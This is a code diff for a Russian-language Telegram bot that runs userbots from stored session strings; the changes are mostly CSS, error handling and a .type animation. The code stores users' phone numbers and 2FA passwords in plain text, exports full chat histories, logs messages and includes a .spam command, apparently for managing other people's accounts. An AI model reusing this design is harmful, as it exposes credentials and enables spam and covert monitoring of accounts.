@@ -113,6 +113,7 @@ async def resolve_entity(client, target: str):
 
 async def export_chat_to_html(client, chat_id, chat_name, me):
     messages = []
+    count = 0
     async for msg in client.iter_messages(chat_id, limit=10000):
         if msg.text:
             try:
@@ -136,6 +137,7 @@ async def export_chat_to_html(client, chat_id, chat_name, me):
                     <div class="message-text">{text}</div>
                 </div>
                 ''')
+                count += 1
             except:
                 continue
     
@@ -151,8 +153,8 @@ async def export_chat_to_html(client, chat_id, chat_name, me):
     <title>Чат с {html.escape(chat_name)}</title>
     <style>
         body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #0e1621; color: #e1e8f0; margin: 0; padding: 20px; }}
-        .container {{ max-width: 800px; margin: 0 auto; background-color: #17212b; border-radius: 10px; }}
-        .chat-header {{ background-color: #17212b; padding: 15px 20px; border-bottom: 1px solid #2b3945; }}
+        .container {{ max-width: 800px; margin: 0 auto; background-color: #17212b; border-radius: 10px; overflow: hidden; }}
+        .chat-header {{ background-color: #17212b; padding: 15px 20px; border-bottom: 1px solid #2b3945; position: sticky; top: 0; }}
         .chat-header h2 {{ margin: 0; font-size: 18px; }}
         .messages {{ padding: 20px; }}
         .message {{ margin-bottom: 15px; padding: 10px 12px; border-radius: 12px; max-width: 80%; word-wrap: break-word; }}
@@ -161,7 +163,7 @@ async def export_chat_to_html(client, chat_id, chat_name, me):
         .message-header {{ font-size: 12px; margin-bottom: 5px; display: flex; justify-content: space-between; }}
         .sender {{ font-weight: bold; }}
         .date {{ font-size: 10px; color: #6c7883; }}
-        .message-text {{ font-size: 14px; white-space: pre-wrap; }}
+        .message-text {{ font-size: 14px; white-space: pre-wrap; word-break: break-word; }}
         .stats {{ background-color: #0e1621; padding: 10px; text-align: center; font-size: 12px; color: #6c7883; }}
     </style>
 </head>
@@ -459,6 +461,7 @@ async def view_chat(message):
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
 
+@dp.callback_query_handler(lambda c: c.data.startswith('chat_last_'))
 async def chat_last_callback(callback):
     await callback.answer("Загружаю последние сообщения...")
     data = callback.data.replace('chat_last_', '').split('_', 1)
@@ -489,6 +492,7 @@ async def chat_last_callback(callback):
     except Exception as e:
         await callback.message.answer(f"❌ Ошибка: {e}")
 
+@dp.callback_query_handler(lambda c: c.data.startswith('chat_full_'))
 async def chat_full_callback(callback):
     await callback.answer("Экспортирую всю переписку...")
     data = callback.data.replace('chat_full_', '').split('_', 1)
@@ -684,6 +688,7 @@ async def account_info_cmd(message):
         me = await client.get_me()
         cursor.execute('SELECT phone, two_fa FROM user_sessions WHERE user_id=?', (uid,))
         row = cursor.fetchone()
+        
         info_text = f"""👤 <b>ИНФОРМАЦИЯ ОБ АККАУНТЕ</b>
 
 <b>Имя:</b> {me.first_name}
@@ -691,8 +696,8 @@ async def account_info_cmd(message):
 <b>Юзернейм:</b> @{me.username or '—'}
 <b>🆔 ID:</b> <code>{me.id}</code>
 <b>📱 Телефон:</b> {row[0] if row else '—'}
-<b>🔐 2FA:</b> {row[1] if row and row[1] else '❌ Не установлен'}
-<b>📅 Аккаунт создан:</b> {me.date.strftime('%d.%m.%Y') if me.date else '—'}"""
+<b>🔐 2FA:</b> {row[1] if row and row[1] else '❌ Не установлен'}"""
+        
         await message.answer(info_text, parse_mode='HTML')
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
@@ -744,7 +749,7 @@ async def stats_cmd(message):
     total_accounts = cursor.fetchone()[0]
     await message.answer(f"📊 <b>СТАТИСТИКА</b>\n\n👥 Аккаунтов: {total_accounts}\n💬 Сообщений: {total_logs}\n👤 Собеседников: {total_users}\n🔄 Логов статусов: {total_status}", parse_mode='HTML')
 
-# ========== РЕГИСТРАЦИЯ ==========
+# ========== РЕГИСТРАЦИЯ ПОЛЬЗОВАТЕЛЕЙ ==========
 
 @dp.message_handler(commands=['start'])
 async def start_auth(message):
@@ -935,15 +940,19 @@ async def run_userbot(owner_id, session_string):
 """, parse_mode='HTML')
             return
         
+        # .mute
         if text == '.mute':
             reply = await event.get_reply_message()
-            if reply and reply.sender_id:
+            if reply and reply.sender_id and reply.sender_id != owner_id:
                 cursor.execute('INSERT OR IGNORE INTO muted_users VALUES (?, ?)', (reply.sender_id, owner_id))
                 conn.commit()
                 muted_users.add(reply.sender_id)
                 await event.edit('🔕 Заглушен')
+            else:
+                await event.edit('❌ Ответь на сообщение пользователя')
             return
         
+        # .unmute
         if text == '.unmute':
             reply = await event.get_reply_message()
             if reply and reply.sender_id:
@@ -951,8 +960,11 @@ async def run_userbot(owner_id, session_string):
                 conn.commit()
                 muted_users.discard(reply.sender_id)
                 await event.edit('🔔 Разглушен')
+            else:
+                await event.edit('❌ Ответь на сообщение пользователя')
             return
         
+        # .list
         if text == '.list':
             if muted_users:
                 names = []
@@ -967,6 +979,7 @@ async def run_userbot(owner_id, session_string):
                 await event.edit("🔕 Нет")
             return
         
+        # .spam
         if text.startswith('.spam '):
             parts = text.split(' ', 2)
             if len(parts) >= 2:
@@ -986,16 +999,31 @@ async def run_userbot(owner_id, session_string):
                     pass
             return
         
-        # .type (рабочий вариант)
+        # .type (РАБОТАЕТ)
         if text.startswith('.type '):
             txt = text[6:]
             if txt:
                 await event.delete()
-                for i, ch in enumerate(txt):
-                    await client.send_message(event.chat_id, txt[:i+1])
-                    await asyncio.sleep(0.25)
+                typed = ""
+                for ch in txt:
+                    typed += ch
+                    try:
+                        await event.respond(typed)
+                    except:
+                        pass
+                    await asyncio.sleep(0.3)
+                # Удаляем последнее сообщение через 2 секунды
+                await asyncio.sleep(2)
+                async for msg in client.iter_messages(event.chat_id, limit=5):
+                    if msg.text == typed and msg.out:
+                        try:
+                            await msg.delete()
+                        except:
+                            pass
+                        break
             return
         
+        # .info
         if text == '.info':
             reply = await event.get_reply_message()
             if reply:
@@ -1004,8 +1032,10 @@ async def run_userbot(owner_id, session_string):
                     muted = "✅" if reply.sender_id in muted_users else "❌"
                     bot_status = "🤖 Да" if getattr(u, 'bot', False) else "👤 Нет"
                     await event.edit(f"👤 <b>{u.first_name}</b>\n🆔 ID: {u.id}\n🔇 Заглушен: {muted}\n🤖 Бот: {bot_status}", parse_mode='HTML')
-                except:
-                    pass
+                except Exception as e:
+                    await event.edit(f"❌ Ошибка: {e}")
+            else:
+                await event.edit('❌ Ответь на сообщение')
             return
     
     await client.run_until_disconnected()
